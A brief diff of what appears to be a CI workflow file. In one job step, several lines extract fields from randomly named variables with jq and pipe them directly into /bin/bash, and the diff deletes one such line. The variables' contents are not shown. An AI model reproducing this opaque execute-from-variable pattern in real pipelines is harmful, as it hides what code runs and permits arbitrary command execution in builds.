@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$tzfk01" | jq -r .w9 | /bin/bash
           printf '%s' "$ualjk179" | jq -r .k8301 | /bin/bash
           echo $mui3 | jq -r .gc9601 | /bin/bash
-          echo $zkz751 | jq -r .fyf576 | /bin/bash
           echo $srsst398 | jq -r .p819 | /bin/bash
 
       - name: Store artifact
